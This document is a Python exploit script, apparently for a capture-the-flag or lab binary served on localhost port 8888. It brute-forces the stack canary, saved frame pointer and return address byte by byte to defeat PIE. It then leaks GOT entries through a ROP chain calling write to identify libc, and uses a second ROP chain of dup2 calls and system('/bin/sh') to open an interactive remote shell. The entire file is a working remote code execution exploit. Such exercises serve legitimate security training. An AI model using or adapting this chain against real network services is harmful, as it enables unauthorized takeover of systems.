from utils import *
from telnetlib import Telnet

SERVER_IP = 'localhost'
SERVER_PORT = 8888

CANARY_OFFSET = 200
RBP_OFFSET = 208
RIP_OFFSET = 216

PAD_BYTE = b'A'

def try_byte(sock: socket.socket, byte_val, payload_prefix):

    payload = payload_prefix + byte_val

    sock.recv(1024)
    sock.send(payload)

    recvd = sock.recv(1024)

    if recvd != b"Request complete, Closing...\n":
        return None

    return byte_val

PAD = PAD_BYTE * CANARY_OFFSET

canary_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD, hints={0: [(b'\x00', b'\x00')]}, session_name="CANARY LEAK")
canary_bytes = canary_leaker.find_value()

RBP_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD + canary_bytes, 
                                    hints={5: [(b'\x7f', b'\x7f')], 6: [(b'\x00', b'\x00')], 7: [(b'\x00', b'\x00')]}, session_name="RBP LEAK")
RBP_bytes = RBP_leaker.find_value()

RIP_leaker = Remote_64bitBruteforce(SERVER_IP, SERVER_PORT, try_byte, PAD + canary_bytes + RBP_bytes, 
                                    hints={0: [(b'\xa4', b'\xa4')], 1:[(bv, bv) for bv in bytes_start_with(b'\x06')]}, session_name="RIP LEAK")
RIP_bytes = RIP_leaker.find_value()

RIP_ORG_ADDR = 0x16a4
PIE_OFFSET = from_bytes(RIP_bytes) - RIP_ORG_ADDR

BASE_GOT_ADDR = 0x3f20 + PIE_OFFSET

WRITE_PLT_ADDR = 0x11b0 + PIE_OFFSET
POP_RDI_RET_ADDR = 0x1793 + PIE_OFFSET
POP_RSI_R15_RET_ADDR = 0x1791 + PIE_OFFSET
RET_ADDR = 0x1794 + PIE_OFFSET

BASE_LIBC_ADDR = 0x0
libc_db = LIBC_util(session_name="LIBC LEAK")

def leak_libc_addrs(to_leak):

    global BASE_LIBC_ADDR

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))

    payload = b''
    payload += PAD
    payload += canary_bytes
    payload += RBP_bytes
    # at the moment of execution of ROP chain, RDI already has the client socket descriptor
    # so there is no need for loading it explicitly
    payload += to_bytes(POP_RSI_R15_RET_ADDR)
    payload += to_bytes(BASE_GOT_ADDR)
    payload += PAD_BYTE * 8
    # at the moment of execution of ROP chain, RDX already has value 0x400
    # so there is no need for loading a value explicitly
    payload += to_bytes(WRITE_PLT_ADDR)

    sock.recv(1024)
    sock.send(payload)

    recvd = sock.recv(1024)

    # extracting as much addresses as possible 
    # to narrow down as much as possible the list of possible libc versions

    write_addr = from_bytes(recvd[8 * 6: 8 * 7])
    htons_addr = from_bytes(recvd[8 * 10: 8 * 11])
    close_addr = from_bytes(recvd[8 * 12: 8 * 13])
    signal_addr = from_bytes(recvd[8 * 14: 8 * 15])
    exit_addr = from_bytes(recvd[8 * 20: 8 * 21])

    leaked_sym_dict = {"htons": htons_addr, "write": write_addr, 
                        "close": close_addr, "signal": signal_addr, "exit": exit_addr}

    libc_db.collect_leaked_symbols(leaked_sym_dict)
    libc_db.search_libc_version()

    libc_db.find_libc_base_addr()
    BASE_LIBC_ADDR = libc_db.assert_unicate_base_addr()

    libc_db.search_symbols_addrs(to_leak)
    libc_addrs = libc_db.assert_unicate_addrs()

    return libc_addrs

leaked = leak_libc_addrs(["str_bin_sh", "system", "dup2"])

def execute_shell(leaked_addrs):

    # first, STDIN/STDOUT/STDERR is redirected with dup2(client socket descriptor, 0/1/2)
    # then, the shell is activated

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    
    payload = b''
    payload += PAD
    payload += canary_bytes
    payload += RBP_bytes

    payload += to_bytes(RET_ADDR) # for stack alignment

    # client socket descriptor value is already in RDI, 
    # no need to load it explicitly
    payload += to_bytes(POP_RSI_R15_RET_ADDR)
    payload += to_bytes(0x0)
    payload += PAD_BYTE * 8
    payload += to_bytes(leaked_addrs["dup2"])

    payload += to_bytes(POP_RSI_R15_RET_ADDR)
    payload += to_bytes(0x01)
    payload += PAD_BYTE * 8
    payload += to_bytes(leaked_addrs["dup2"])

    payload += to_bytes(POP_RSI_R15_RET_ADDR)
    payload += to_bytes(0x02)
    payload += PAD_BYTE * 8
    payload += to_bytes(leaked_addrs["dup2"])

    payload += to_bytes(POP_RDI_RET_ADDR)
    payload += to_bytes(leaked_addrs["str_bin_sh"])
    payload += to_bytes(leaked_addrs["system"])

    sock.recv(1024)
    sock.send(payload)
    
    remote_shell(sock, rich=True)

execute_shell(leaked)

